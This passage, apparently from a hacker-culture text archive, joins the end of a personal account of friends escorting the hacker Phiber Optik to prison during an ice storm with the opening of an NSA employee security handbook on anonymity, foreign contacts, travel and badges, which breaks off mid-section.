 done the night before. This time, he wound up getting transferred
 a couple of times. They weren&#039;t able to find Mark&#039;s name anywhere.
 But that good fortune didn&#039;t last - &quot;Oh yeah, I know who you&#039;re
 talking about,&quot; the person on the phone said. Bernie explained the
 situation to them and said that the State Troopers were telling
 people not to travel. So what were we to do? &quot;Well,&quot; the
 friendly-sounding voice on the other end said, &quot;just get here when
 you can get here.&quot; We were overjoyed. Yet more freedom for Mark all
 because of a freak of nature! I told Bernie that he had already
 been more successful than Mark&#039;s lawyer in keeping him out of
 prison.

 We spent the afternoon getting ready for the meeting, watching The
 Weather Channel, and consuming tea and TastyKakes in front of a
 roaring fire. At one point we turned to a channel that was hawking
 computer education videos for kids. &quot;These children,&quot; the fake
 schoolteacher was saying with equally fake enthusiasm, &quot;are going
 to be at such an advantage because they&#039;re taking an early interest
 in computers.&quot; &quot;Yeah,&quot; we heard Mark say with feigned glee from
 another room, &quot;they may get to experience *prison* for a year!&quot;

 It took about 45 minutes to get all of the ice off our cars.
 Negotiating hills and corners became a matter of great concern. But
 we made it to the meeting, which took place in the middle of 30th
 Street Station, where all of the Amtrak trains were two and a half
 hours late. Because of the weather, attendance was less than usual
 but the people that showed up were enthusiastic and glad to meet
 Phiber Optik as he passed by on his way up the river.

 After the meeting we found a huge tunnel system to explore,
 complete with steampipes and &quot;Poseidon Adventure&quot; rooms. Everywhere
 we went, there were corridors leading to new mysteries and strange
 sights. It was amazing to think that the moment when everybody
 figured Mark would be in prison, here he was with us wandering
 around in the bowels of a strange city. The karma was great.

 But then the real fun began. We decided to head back to South
 Street to find slow food - in fact, what would probably be Mark&#039;s
 last genuine meal. But Philadelphia was not like New York. When the
 city is paralyzed, it really is paralyzed. Stores close and people
 stay home, even on a Friday night. We wanted to take him to a Thai
 place but both of the ones we knew of were closed. We embarked on
 a lengthy search by foot for an open food place. The sidewalks and
 the streets were completely encased in ice. Like drunken sailors in
 slow motion, we all staggered down the narrow streets, no longer so
 much concerned with food, but just content to remain upright.
 People, even dogs, were slipping and falling all around us. We did
 our best to maintain dignity but hysterical laughter soon took over
 because the situation was too absurd to believe. Here we were in a
 strange city, unable to stand upright in a veritable ice palace,
 trying to figure out a way to get one of our own into a prison. I
 knew it was going to be a strange trip but this could easily beat
 any drug.

 We ate like kings in a Greek place somewhere for a couple of hours,
 then walked and crawled back to the cars. The plan now was to take
 Mark to prison on Saturday when hopefully the roads would be
 passable. Actually, we were all hoping this would go on for a while
 longer but we knew it had to end at some point. So, after a stop at
 an all-night supermarket that had no power and was forced to ring
 up everything by hand, we made it back to Bernie&#039;s for what would
 really be Mark&#039;s last free night. It was well after midnight and
 Mark was now officially late for prison. (Mark has a reputation for
 being late to things but at least this time the elements could take
 the blame.) We wound up watching the &quot;Holy Grail&quot; videotape until
 it was practically light again. One of the last things I remember
 was hearing Mark say how he wanted to sleep as little as possible
 so he could be awake and free longer.

 We left Bernie&#039;s late Saturday afternoon. It was sad because the
 aura had been so positive and now it was definitely ending. We were
 leaving the warmth of a house with a fireplace and a conversation
 pit, journeying into the wild and the darkness with wind chill
 factors well below zero. And this time, we weren&#039;t coming back.

 We took two cars - Bernie and Rob in one; me, Mark, Walter, and
 Roman in the other. We kept in touch with two way radios which was
 a very good idea considering the number of wrong turns we always
 manage to make. We passed through darkened towns and alien
 landscapes, keeping track of the number of places left to go
 through. We found a convenience store that had six foot tall beef
 jerky and Camel Light Wides. Since Mark smokes Camel Lights (he had
 managed to quit but all of the stress of the past year has gotten
 him right back into it), and since he had never heard of the wide
 version, I figured he&#039;d like to compare the two, so I bought him a
 pack. I never buy cigarettes for anyone because I can&#039;t stand them
 and I think they&#039;re death sticks but in this case I knew they&#039;d be
 therapeutic. As we stood out there in the single digits - him with
 his Wides, me with my iced tea - he said he could definitely feel
 more smoke per inch. And, for some reason, I was glad to hear it.

 Minersville was our final destination but we had one more town to
 pass through - Frackville. Yeah, no shit. It was the final dose of
 that magical karma we needed. As we looked down the streets of this
 tiny town, we tried to find a sign that maybe we could take a
 picture of, since nobody would ever believe us. We pulled up to a
 convenience store as two cops were going in. And that&#039;s when we
 realized what we had been sent there to do.

 Bernie S. went in to talk to the cops and when he came out, he had
 convinced them to pose with Mark in front of their squad car. (It
 didn&#039;t really take much convincing - they were amazed that anyone
 would care.) So, if the pictures come out, you can expect to see a
 shot of Phiber Optik being &quot;arrested&quot; by the Frackville police, all
 with big smiles on their faces. Frackville, incidentally, has a
 population of about 5,000 which I&#039;m told is about the distribution
 of Phrack Magazine. Kinda cosmic.

 So now there was nothing left to do. We couldn&#039;t even get lost -
 the prison was straight ahead of us. Our long journey was about to
 come to a close. But it had been incredible from the start; there
 was no reason to believe the magic would end here. The prison
 people would be friendly, maybe we&#039;d chat with them for a while.
 They&#039;d make hot chocolate. All right, maybe not. But everybody
 would part on good terms. We&#039;d all give Mark a hug. Our sadness
 would be countered by hope.

 The compound was huge and brightly lit. We drove through it for
 miles before reaching the administration building. We assumed this
 was where Mark should check in so we parked the cars there and took
 a couple of final videos from our camcorder. Mark was nervous but
 he was still Mark. &quot;I think the message is &#039;come here in the
 summer,&#039;&quot; he said to the camera as we shivered uncontrollably in
 the biting freeze.

 As we got to the door of the administration building, we found it
 to be locked. We started looking for side doors or any other way to
 get in. &quot;There&#039;s not a record of people breaking *into* prison,&quot;
 Bernie wondered out loud. It was still more craziness. Could they
 actually be closed?

 I drove down the road to another building and a dead end. Bernie
 called the prison from his cellular phone. He told them he was in
 front of the administration building and he wanted to check
 somebody in. They were very confused and said there was no way he
 could be there. He insisted he was and told them he was in his car.
 &quot;You have a *car* phone?&quot; they asked in amazement. When the dust
 settled, they said to come down to the building at the end of the
 road where I was already parked. We waited around for a couple of
 minutes until we saw some movement inside. Then we all got out and
 started the final steps of our trip.

 I was the first one to get to the door. A middle-aged bespectacled
 guy was there. I said hi to him but he said nothing and fixed his
 gaze on the five other people behind me.

 &quot;All right, who&#039;s from the immediate family?&quot;

 &quot;None of us are immediate family. We&#039;re just--&quot;

 &quot;Who&#039;s the individual reporting in?&quot;

 &quot;I&#039;m the individual reporting in,&quot; Mark said quietly.

 &quot;The only one I need is just him.&quot;

 The guard asked Mark if he had anything on him worth more than
 $100. Mark said he didn&#039;t. The guard turned to us.

 &quot;All right, gentlemen. He&#039;s ours. Y&#039;all can depart.&quot;

 They pulled him inside and he was gone. No time for goodbyes from
 any of us - it happened that fast. It wasn&#039;t supposed to have been
 like this; there was so much to convey in those final moments.
 Mark, we&#039;re with you... Hang in there... We&#039;ll come and visit....
 Just a fucking goodbye for God&#039;s sake.

 It caught us all totally off guard. They were treating him like a
 maximum security inmate. And they treated us like we were nothing,
 like we hadn&#039;t been through this whole thing together, like we
 hadn&#039;t just embarked on this crazy adventure for the last few days.
 The karma was gone.

 From behind the door, a hooded figure appeared holding handcuffs.
 He looked through the glass at us as we were turning to leave.
 Suddenly, he opened the outer door and pointed to our camera. &quot;You
 can&#039;t be videotaping the prison here,&quot; he said. &quot;All right,&quot; I
 replied, being the closest one to him and the last to start back to
 the cars. As I turned away, he came forward and said, &quot;We gotta
 have that film.&quot; &quot;But we didn&#039;t take any pictures of the prison!&quot;
 I objected. &quot;We gotta take it anyway,&quot; he insisted.

 We all knew what to do. Giving up the tape would mean losing all
 recordings of Mark&#039;s last days of freedom. The meeting in
 Philadelphia, slipping down the icy streets, hanging out in
 Bernie&#039;s house, Frackville.... No way. No fucking way.

 Roman, who had been our cameraman throughout, carefully passed off
 the camera to Bernie, who quickly got to the front of the group. I
 stayed behind to continue insisting that we hadn&#039;t filmed any part
 of their precious prison. I didn&#039;t even get into the fact that
 there are no signs up anywhere saying this and that it appeared to
 me that he was imposing this rule just to be a prick. Not that I
 would have, since Mark was somewhere inside that building and
 anything we did could have repercussions for him. Fortunately, the
 hooded guard appeared to conclude that even if he was able to grab
 our camera, he&#039;d probably never find the tape. And he never would
 have.

 The hooded guard stepped back inside and we went on our way. If it
 had been dark and cold before, now it was especially so. And we all
 felt the emptiness that had replaced Mark, who had been an active
 part of our conversations only a couple of minutes earlier. We
 fully expected to be stopped or chased at any moment for the
 &quot;trouble&quot; we had caused. It was a long ride out of the compound.

 We headed for the nearest major town:  Pottsville. There, we went to
 the only 24 hour anything in miles, a breakfast/burger joint called
 Coney Island of all things. We just kind of sat there for awhile,
 not really knowing what to say and feeling like real solid shit.
 Roman took out the camcorder and started looking through the view
 screen. &quot;We got it,&quot; he said. &quot;We got it all.&quot;

 Looking at the tape, the things that really hit me hard are the
 happy things. Seeing the cops of Frackville posing and laughing
 with Mark, only a few minutes before that ugly episode, puts a
 feeling of lead in my stomach. I&#039;m just glad we gave him a hell of
 a sendoff; memories of it will give him strength to get through
 this.

 What sticks with me the most is the way Mark never changed, right
 up to the end. He kept his incredible sense of humor, his caustic
 wit, his curiosity and sense of adventure. And he never stopped
 being a hacker in the true sense. What would a year of this
 environment do to such a person?

 Our long ride back to New York was pretty quiet for the most part.
 Occasionally we&#039;d talk about what happened and then we&#039;d be alone
 with our thoughts. My thoughts are disturbing. I know what I saw
 was wrong. I know one day we&#039;ll realize this was a horrible thing
 to do to somebody in the prime of life. I don&#039;t doubt any of that.
 What I worry about is what the cost will be. What will happen to
 these bright, enthusiastic, and courageous people I&#039;ve come to know
 and love? How many of us will give up and become embittered shells
 of the full individuals we started out as? Already, I&#039;ve caught
 myself muttering aloud several times, something new for me.

 Mark was not the only one, not by far. But he was a symbol - even
 the judge told him that at the sentencing. And a message was sent,
 as our system of justice is so fond of doing. But this time another
 message was sent - this one from Mark, his friends, and the scores
 of other hackers who spoke up. Everybody knew this wasn&#039;t right.
 All through this emotional sinkhole, our tears come from sadness
 and from anger. And, to quote the Clash, &quot;Anger can be power.&quot; Now
 we just have to learn to use it.

Security Guidelines

This handbook is designed to introduce you to some of the basic
security principles and procedures with which all NSA employees must comply.
It highlights some of your security responsibilities, and provides guidelines
for answering questions you may be asked concerning your association with this
Agency.  Although you will be busy during the forthcoming weeks learning your
job, meeting co-workers, and becoming accustomed to a new work environment, you
are urged to become familiar with the security information contained in this
handbook.  Please note that a listing of telephone numbers is provided at the
end of this handbook should you have any questions or concerns.

Introduction

In joining NSA you have been given an opportunity to participate in the
activities of one of the most important intelligence organizations of the United
States Government.  At the same time, you have also assumed a trust which
carries with it a most important individual responsibility--the safeguarding of
sensitive information vital to the security of our nation.

While it is impossible to estimate in actual dollars and cents the value of the
work being conducted by this Agency, the information to which you will have
access at NSA is without question critically important to the defense of the
United States.  Since this information may be useful only if it is kept secret,
it requires a very special measure of protection.  The specific nature of this
protection is set forth in various Agency security regulations and directives.
The total NSA Security Program, however, extends beyond these regulations.  It
is based upon the concept that security begins as a state of mind.  The program
is designed to develop an appreciation of the need to protect information vital
to the national defense, and to foster the development of a level of awareness
which will make security more than routine compliance with regulations.

At times, security practices and procedures cause personal inconvenience.  They
take time and effort and on occasion may make it necessary for you to
voluntarily forego some of your usual personal perogatives.  But your
compensation for the inconvenience is the knowledge that the work you are
accomplishing at NSA, within a framework of sound security practices,
contributes significantly to the defense and continued security of the United
States of America.

I extend to you my very best wishes as you enter upon your chosen career or
assignment with NSA.

Philip T. Pease
Director of Security


INITIAL SECURITY RESPONSIBILITIES

Anonymity

Perhaps one of the first security practices with which new NSA personnel should
become acquainted is the practice of anonymity.  In an open society such as ours,
this practice is necessary because information which is generally available to
the public is available also to hostile intelligence.  Therefore, the Agency
mission is best accomplished apart from public attention.  Basically, anonymity
means that NSA personnel are encouraged not to draw attention to themselves nor
to their association with this Agency.  NSA personnel are also cautioned neither
to confirm nor deny any specific questions about NSA activities directed to them
by individuals not affiliated with the Agency.

The ramifications of the practice of anonymity are rather far reaching, and its
success depends on the cooperation of all Agency personnel.  Described below you
will find some examples of situations that you may encounter concerning your
employment and how you should cope with them.  Beyond the situations cited, your
judgement and discretion will become the deciding factors in how you respond to
questions about your employment.

Answering Questions About Your Employment

Certainly, you may tell your family and friends that you are employed at or
assigned to the National Security Agency.  There is no valid reason to deny them
this information.  However, you may not disclose to them any information
concerning specific aspects of the Agency&#039;s mission, activities, and
organization.  You should also ask them not to publicize your association with
NSA.

Should strangers or casual acquaintances question you about your place of
employment, an appropriate reply would be that you work for the Department of
Defense.  If questioned further as to where you are employed within the
Department of Defense, you may reply, &quot;NSA.&quot;  When you inform someone that you
work for NSA (or the Department of Defense) you may expect that the next
question will be, &quot;What do you do?&quot;  It is a good idea to anticipate this
question and to formulate an appropriate answer.  Do not act mysteriously about
your employment, as that would only succeed in drawing more attention to
yourself.

If you are employed as a secretary, engineer, computer scientist, or in a
clerical, administrative, technical, or other capacity identifiable by a general
title which in no way indicates how your talents are being applied to the
mission of the Agency, it is suggested that you state this general title.  If
you are employed as a linguist, you may say that you are a linguist, if
necessary.  However, you should not indicate the specific language(s) with which
you are involved.

The use of service specialty titles which tend to suggest or reveal the nature of
the Agency&#039;s mission  or specific aspects of their work.  These professional
titles, such as cryptanalyst, signals collection officer, and intelligence
research analyst, if given verbatim to an outsider, would likely generate
further questions which may touch upon the classified aspects of your work.
Therefore, in conversation with outsiders, it is suggested that such job titles
be generalized.  For example, you might indicate that you are a &quot;research
analyst.&quot;  You may not, however, discuss the specific nature of your analytic
work.

Answering Questions About Your Agency Training

During your career or assignment at NSA, there is a good chance that you will
receive some type of job-related training.  In many instances the nature of the
training is not classified.  However, in some situations the specialized
training you receive will relate directly to sensitive Agency functions.  In
such cases, the nature of this training may not be discussed with persons
outside of this Agency.

If your training at the Agency includes language training, your explanation for
the source of your linguistic knowledge should be that you obtained it while
working for the Department of Defense.

You Should not draw undue attention to your language abilities, and you may not
discuss how you apply your language skill at the Agency.

If you are considering part-time employment which requires the use of language
or technical skills similar to those required for the performance of your NSA
assigned duties, you must report (in advance) the anticipated part-time work
through your Staff Security Officer (SSO) to the Office of Security&#039;s Clearance
Division (M55).

Verifying Your Employment

On occasion, personnel must provide information concerning their employment to
credit institutions in connection with various types of applications for credit.
In such situations you may state, if you are a civilian employee, that you are
employed by NSA and indicate your pay grade or salary.  Once again, generalize
your job title.  If any further information is desired by persons or firms with
whom you may be dealing, instruct them to request such information by
correspondence addressed to:  Director of Civilian Personnel, National Security
Agency, Fort George G. Meade, Maryland 20755-6000.  Military personnel should
use their support group designator and address when indicating their current
assignment.

If you contemplate leaving NSA for employment elsewhere, you may be required to
submit a resume/job application, or to participate in extensive employment
interviews.  In such circumstances, you should have your resume reviewed by the
Classification Advisory Officer (CAO) assigned to your organization.  Your CAO
will ensure that any classified operational details of your duties have been
excluded and will provide you with an unclassified job description.  Should you
leave the Agency before preparing such a resume, you may develop one and send it
by registered mail to the NSA/CSS Information Policy Division (Q43) for review.
Remember, your obligation to protect sensitive Agency information extends
beyond your employment at NSA.

The Agency And Public News Media

From time to time you may find that the agency is the topic of reports or
articles appearing in public news media--newspapers, magazines, books, radio
and TV.  The NSA/CSS Information Policy Division (Q43) represents the Agency in
matters involving the press and other media.  This office serves at the
Agency&#039;s official media center and is the Director&#039;s liaison office for public
relations, both in the community and with other government agencies.  The
Information Policy Division must approve the release of all information for and
about NSA, its mission, activities, and personnel.  In order to protect the
aspects of Agency operations, NSA personnel must refrain from either confirming
or denying any information concerning the Agency or its activities which may
appear in the public media.  If you are asked about the activities of NSA, the
best response is &quot;no comment.&quot;  You should the notify Q43 of the attempted
inquiry.  For the most part, public references to NSA are based upon educated
guesses.  The Agency does not normally make a practice of issuing public
statements about its activities.

GENERAL RESPONSIBILITIES

Espionage And Terrorism

During your security indoctrination and throughout your NSA career you will
become increasingly aware of the espionage and terrorist threat to the United
States.  Your vigilance is the best single defense in protecting NSA
information, operations, facilities and people.  Any information that comes to
your attention that suggests to you the existence of, or potential for,
espionage or terrorism against the U.S. or its allies must be promptly reported
by you to the Office of Security.

There should be no doubt in your mind about the reality of the threats.  You
are now affiliated with the most sensitive agency in government and are
expected to exercise vigilance and common sense to protect NSA against these
threats.

Classification

Originators of correspondence, communications, equipment, or documents within
the Agency are responsible for ensuring that the proper classification,
downgrading information and, when appropriate, proper caveat notations are
assigned to such material.  (This includes any handwritten notes which contain
classified information).  The three levels of classification are Confidential,
Secret and Top Secret.  The NSA Classification Manual should be used as
guidance in determining proper classification.  If after review of this document
you need assistance, contact the Classification Advisory Officer (CAO) assigned
to your organization, or the Information Policy Division (Q43).

Need-To-Know

Classified information is disseminated only on a strict &quot;need-to-know&quot; basis.
The &quot;need-to-know&quot; policy means that classified information will be
disseminated only to those individuals who, in addition to possessing a proper
clearance, have a requirement to know this information in order to perform
their official duties (need-to-know).  No person is entitled to classified
information solely by virtue of office, position, rank, or security clearance.

All NSA personnel have the responsibility to assert the &quot;need-to-know&quot; policy
as part of their responsibility to protect sensitive information.
Determination of &quot;need-to-know&quot; is a supervisory responsibility.  This means
that if there is any doubt in your mind as to an individual&#039;s &quot;need-to-know,&quot;
you should always check with your supervisor before releasing any classified
material under your control.

For Official Use Only

Separate from classified information is information or material marked &quot;FOR
OFFICIAL USE ONLY&quot; (such as this handbook).  This designation is used to
identify that official information or material which, although unclassified, is
exempt from the requirement for public disclosure of information concerning
government activities and which, for a significant reason, should not be given
general circulation.  Each holder of &quot;FOR OFFICAL USE ONLY&quot; (FOUO) information
or material is authorized to disclose such information or material to persons
in other departments or agencies of the Executive and Judicial branches when it
is determined that the information or material is required to carry our a
government function.  The recipient must be advised that the information or
material is not to be disclosed to the general public.  Material which bears
the &quot;FOR OFFICIAL USE ONLY&quot; caveat does not come under the regulations
governing the protection of classified information.  The unauthorized
disclosure of information marked &quot;FOR OFFICIAL USE ONLY&quot; does not constitute an
unauthorized disclosure of classified defense information.  However, Department
of Defense and NSA regulations prohibit the unauthorized disclosure of
information designated &quot;FOR OFFICIAL USE ONLY.&quot;  Appropriate administrative
action will be taken to determine responsibility and to apply corrective and/or
disciplinary measures in cases of unauthorized disclosure of information which
bears the &quot;FOR OFFICIAL USE ONLY&quot; caveat.  Reasonable care must be exercised in
limiting the dissemination of &quot;FOR OFFICIAL USE ONLY&quot; information.  While you
may take this handbook home for further study, remember that is does contain
&quot;FOR OFFICIAL USE ONLY&quot; information which should be protected.

Prepublication Review

All NSA personnel (employees, military assignees, and contractors) must submit
for review any planned articles, books, speeches, resumes, or public statements
that may contain classified, classifiable, NSA-derived, or unclassified
protected information, e.g., information relating to the organization, mission,
functions, or activities of NSA.  Your obligation to protect this sensitive
information is a lifetime one.  Even when you resign, retire, or otherwise end
your affiliation with NSA, you must submit this type of material for
prepublication review.  For additional details, contact the Information Policy
Division (Q43) for an explanation of prepublication review procedures.

Personnel Security Responsibilities

Perhaps you an recall your initial impression upon entering an NSA facility.
Like most people, you probably noticed the elaborate physical security
safeguards--fences, concrete barriers, Security Protective Officers,
identification badges, etc.  While these measures provide a substantial degree
of protection for the information housed within our buildings, they represent
only a portion of the overall Agency security program.  In fact, vast amounts
of information leave our facilities daily in the minds of NSA personnel, and
this is where our greatest vulnerability lies.  Experience has indicated that
because of the vital information we work with at NSA, Agency personnel may
become potential targets for hostile intelligence efforts.  Special safeguards
are therefore necessary to protect our personnel.

Accordingly, the Agency has an extensive personnel security program which
establishes internal policies and guidelines governing employee conduct and
activities.  These policies cover a variety of topics, all of which are
designed to protect both you and the sensitive information you will gain
through your work at NSA.

Association With Foreign Nationals

As a member of the U.S. Intelligence Community and by virtue of your access to
sensitive information, you are a potential target for hostile intelligence
activities carried out by or on behalf of citizens of foreign
countries.  A policy concerning association with foreign nationals has been
established by the Agency to minimize the likelihood that its personnel might
become subject to undue influence or duress or targets of hostile activities
through foreign relationships.

As an NSA affiliate, you are prohibited from initiating or maintaining
associations (regardless of the nature and degree) with citizens or officials
of communist-controlled, or other countries which pose a significant threat to
the security of the United States and its interests.  A comprehensive list of
these designated countries is available from your Staff Security Officer or the
Security Awareness Division.  Any contact with citizens of these countries, no
matter how brief or seemingly innocuous, must be reported as soon as possible
to your Staff Security Officer (SSO).  (Individuals designated as Staff
Security Officers are assigned to every organization; a listing of Staff
Security Officers can be found at the back of this handbook).

Additionally, close and continuing associations with any non-U.S. citizens which
are characterized by ties of kinship, obligation, or affection are prohibited.
A waiver to this policy may be granted only under the most exceptional
circumstances when there is a truly compelling need for an individual&#039;s
services or skills and the security risk is negligible.

In particular, a waiver must be granted in advance of a marriage to or
cohabitation with a foreign national in order to retain one&#039;s access to NSA
information.  Accordingly, any intent to cohabitate with or marry a non-U.S.
citizen must be reported immediately to your Staff Security Officer.  If a
waiver is granted, future reassignments both at headquarters and overseas may
be affected.

The marriage or intended marriage of an immediate family member (parents,
siblings, children) to a foreign national must also be reported through your
SSO to the Clearance Division (M55).

Casual social associations with foreign nationals (other than those of the
designated countries mentioned above) which arise from normal living and
working arrangements in the community usually do not have to be reported.
During the course of these casual social associations, you are encouraged to
extend the usual social amenities.  Do not act mysteriously or draw attention
to yourself (and possibly to NSA) by displaying an unusually wary attitude.

Naturally, your affiliation with the Agency and the nature of your work should
not be discussed.  Again, you should be careful not to allow these associations
to become close and continuing to the extent that they are characterized by
ties of kinship, obligation, or affection.

If at any time you feel that a &quot;casual&quot; association is in any way suspicious,
you should report this to your Staff Security Officer immediately.  Whenever
any doubt exists as to whether or not a situation should be reported or made a
matter of record, you should decided in favor of reporting it.  In this way,
the situation can be evaluated on its own merits, and you can be advised as to
your future course of action.

Correspondence With Foreign Nationals

NSA personnel are discouraged from initiating correspondence with individuals
who are citizens of foreign countries.  Correspondence with citizens of
communist-controlled or other designated countries is prohibited.  Casual
social correspondence, including the &quot;penpal&quot; variety, with other foreign
acquaintances is acceptable and need not be reported.  If, however, this
correspondence should escalate in its frequency or nature, you should report
that through your Staff Security Officer to the Clearance Division (M55).

Embassy Visits

Since a significant percentage of all espionage activity is known to be
conducted through foreign embassies, consulates, etc., Agency policy
discourages visits to embassies, consulates or other official establishments of
a foreign government.  Each case, however, must be judged on the circumstances
involved.  Therefore, if you plan to visit a foreign embassy for any reason
(even to obtain a visa), you must consult with, and obtain the prior approval
of, your immediate supervisor and the Security Awareness Division (M56).

Amateur Radio Activities

Amateur radio (ham radio) activities are known to be exploited by hostile
intelligence services to identify individuals with access to classified
information; therefore, all licensed operators are expected to be familiar
with NSA/CSS Regulation 100-1, &quot;Operation of Amateur Radio Stations&quot; (23
October 1986).  The specific limitations on contacts with operators from
communist and designated countries are of particular importance.  If you are
an amateur radio operator you should advise the Security Awareness Division
(M56) of your amateur radio activities so that detailed guidance may be
furnished to you.

Unofficial Foreign Travel

In order to further protect sensitive information from possible compromise
resulting from terrorism, coercion, interrogation or capture of Agency
personnel by hostile nations and/or terrorist groups, the Agency has
established certain policies and procedures concerning unofficial foreign
travel.

All Agency personnel (civilian employees, military assignees, and contractors)
who are planning unofficial foreign travel must have that travel approved by
submitting a proposed itinerary to the Security Awareness Division (M56) at
least 30 working days prior to their planned departure from the United States.
Your itinerary should be submitted on Form K2579 (Unofficial Foreign Travel
Request).  This form provides space for noting the countries to be visited,
mode of travel, and dates of departure and return.  Your immediate supervisor
must sign this form to indicate whether or not your proposed travel poses a
risk to the sensitive information, activities, or projects of which you may
have knowledge due to your current assignment.

After your supervisor&#039;s assessment is made, this form should be forwarded to
the Security Awareness Director (M56).  Your itinerary will then be reviewed in
light of the existing situation in the country or countries to be visited, and
a decision for approval or disapproval will be based on this assessment.  The
purpose of this policy is to limit the risk of travel to areas of the world
where a threat may exist to you and to your knowledge of classified Agency
activities.

In this context, travel to communist-controlled and other hazardous activity
areas is prohibited.  A listing of these hazardous activity areas is
prohibited.  A listing of these hazardous activity areas can be found in Annex
A of NSA/CSS Regulation No. 30-31, &quot;Security Requirements for Foreign Travel&quot;
(12 June 1987).  From time to time, travel may also be prohibited to certain
areas where the threat from hostile intelligence services, terrorism, criminal
activity or insurgency poses an unacceptable risk to Agency employees and to
the sensitive information they possess.  Advance travel deposits made without
prior agency approval of the proposed travel may result in financial losses by
the employee should the travel be disapproved, so it is important to obtain
approval prior to committing yourself financially.  Questions regarding which
areas of the world currently pose a threat should be directed to the Security
Awareness Division (M56).

Unofficial foreign travel to Canada, the Bahamas, Bermuda, and Mexico does not
require prior approval, however, this travel must still be reported using Form
K2579.  Travel to these areas may be reported after the fact.

While you do not have to report your foreign travel once you have ended your
affiliation with the Agency, you should be aware that the risk incurred in
travelling to certain areas, from a personal safety and/or counterintelligence
standpoint, remains high.  The requirement to protect the classified
information to which you have had access is a lifetime obligation.

Membership In Organizations

Within the United States there are numerous organizations with memberships
ranging from a few to tens of thousands.  While you may certainly participate
in the activities of any reputable organization, membership in any international
club or professional organization/activity with foreign members should be
reported through your Staff Security Officer to the Clearance Division (M55).
In most cases there are no security concerns or threats to our employees or
affiliates.  However, the Office of Security needs the opportunity to research
the organization and to assess any possible risk to you and the information to
which you have access.

In addition to exercising prudence in your choice of organizational
affiliations, you should endeavor to avoid participation in public activities
of a conspicuously controversial nature because such activities could focus
undesirable attention upon you and the Agency.  NSA employees may, however,
participate in bona fide public affairs such as local politics, so long as such
activities do not violate the provisions of the statutes and regulations which
govern the political activities of all federal employees.  Additional
information may be obtained from your Personnel Representative.

Changes In Marital Status/Cohabitation/Names

All personnel, either employed by or assigned to NSA, must advise the Office of
Security of any changes in their marital status (either marriage or divorce),
cohabitation arrangements, or legal name changes.  Such changes should be
reported by completing NSA Form G1982 (Report of Marriage/Marital Status
Change/Name Change), and following the instructions printed on the form.

Use And Abuse Of Drugs

It is the policy of the National Security Agency to prevent and eliminate the
improper use of drugs by Agency employees and other personnel associated with
the Agency.  The term &quot;drugs&quot; includes all controlled drugs or substances
identified and listed in the Controlled Substances Act of 1970, as amended,
which includes but is not limited to:  narcotics, depressants, stimulants,
cocaine, hallucinogens ad cannabis (marijuana, hashish, and hashish oil).
The use of illegal drugs or the abuse of prescription drugs by persons employed
by, assigned or detailed to the Agency may adversely affect the national
security; may have a serious damaging effect on the safety and the safety of
others; and may lead to criminal prosecution.  Such use of drugs either within
or outside Agency controlled facilities is prohibited.

Physical Security Policies

The physical security program at NSA provides protection for classified
material and operations and ensures that only persons authorized access to the
Agency&#039;s spaces and classified material are permitted such access.  This
program is concerned not only with the Agency&#039;s physical plant and facilities,
but also with the internal and external procedures for safeguarding the
Agency&#039;s classified material and activities.  Therefore, physical security
safeguards include Security Protective Officers, fences, concrete barriers,
access control points, identification badges, safes, and the
compartmentalization of physical spaces.  While any one of these safeguards
represents only a delay factor against attempts to gain unauthorized access to
NSA spaces and material, the total combination of all these safeguards
represents a formidable barrier against physical penetration of NSA.  Working
together with personnel security policies, they provide &quot;security in depth.&quot;

The physical security program depends on interlocking procedures.  The
responsibility for carrying out many of these procedures rests with the
individual.  This means you, and every person employed by, assign, or detailed
to the Agency, must assume the responsibility for protecting classified
material.  Included in your responsibilities are:  challenging visitors in
operational areas; determining &quot;need-to-know;&quot; limiting classified
conversations to approved areas; following established locking and checking
procedures; properly using the secure and non-secure telephone systems;
correctly wrapping and packaging classified data for transmittal; and placing
classified waste in burn bags.

The NSA Badge

Even before you enter an NSA facility, you have a constant reminder of
security--the NSA badge.  Every person who enters an NSA installation is
required to wear an authorized badge.  To enter most NSA facilities your badge
must be inserted into an Access Control Terminal at a building entrance and you
must enter your Personal Identification Number (PIN) on the terminal keyboard.
In the absence of an Access Control Terminal, or when passing an internal
security checkpoint, the badge should be held up for viewing by a Security
Protective Officer.  The badge must be displayed at all times while the
individual remains within any NSA installation.

NSA Badges must be clipped to a beaded neck chain.  If necessary for the safety
of those working in the area of electrical equipment or machinery, rubber
tubing may be used to insulate the badge chain.  For those Agency personnel
working in proximity to other machinery or equipment, the clip may be used to
attach the badge to the wearer&#039;s clothing, but it must also remain attached to
the chain.

After you leave an NSA installation, remove your badge from public view, thus
avoiding publicizing your NSA affiliation.  Your badge should be kept in a safe
place which is convenient enough to ensure that you will be reminded to bring it
with you to work.  A good rule of thumb is to afford your badge the same
protection you give your wallet or your credit cards.  DO NOT write your
Personal Identification Number on your badge.

If you plan to be away from the Agency for a period of more than 30 days, your
badge should be left at the main Visitor Control Center which services your
facility.

Should you lose your badge, you must report the facts and circumstances
immediately to the Security Operations Center (SOC) (963-3371s/688-6911b) so
that your badge PIN can be deactivated in the Access Control Terminals.  In the
event that you forget your badge when reporting for duty, you may obtain a
&quot;non-retention&quot; Temporary Badge at the main Visitor Control Center which serves
your facility after a co-worker personally identifies your and your clearance
has been verified.

Your badge is to be used as identification only within NSA facilities or other
government installations where the NSA badge is recognized.  Your badge should
never be used outside of the NSA or other government facilities for the purpose
of personal identification.  You should obtain a Department of Defense
identification card from the Civilian Welfare Fund (CWF) if you need to
identify yourself as a government employee when applying for &quot;government
discounts&quot; offered at various commercial establishments.

Your badge color indicates your particular affiliation with NSA and your level
of clearance.  Listed below are explanations of the badge colors you are most
likely to see:

        Green (*)       Fully cleared NSA employees and certain military
                        assignees.

        Orange (*)      (or Gold) Fully cleared representative of other
                        government agencies.

        Black (*)       Fully cleared contractors or consultants.

        Blue            Employees who are cleared to the SECRET level while
                        awaiting completion of their processing for full
                        (TS/SI) clearance.  These Limited Interim Clearance
                        (LIC) employees are restricted to certain activities
                        while inside a secure area.

        Red             Clearance level is not specified, so assume the holder
                        is uncleared.

* - Fully cleared status means that the person has been cleared to the Top
Secret (TS) level and indoctrinated for Special Intelligence (SI).

All badges with solid color backgrounds (permanent badges) are kept by
individuals until their NSA employment or assignment ends.  Striped badges
(&quot;non-retention&quot; badges) are generally issued to visitors and are returned to
the Security Protective Officer upon departure from an NSA facility.

Area Control

Within NSA installations there are generally two types of areas,
Administrative and Secure.  An Administrative Area is one in which storage of
classified information is not authorized, and in which discussions of a
classified nature are forbidden.  This type of area would include the
corridors, restrooms, cafeterias, visitor control areas, credit union, barber
shop, and drugstore.  Since uncleared, non-NSA personnel are often present in
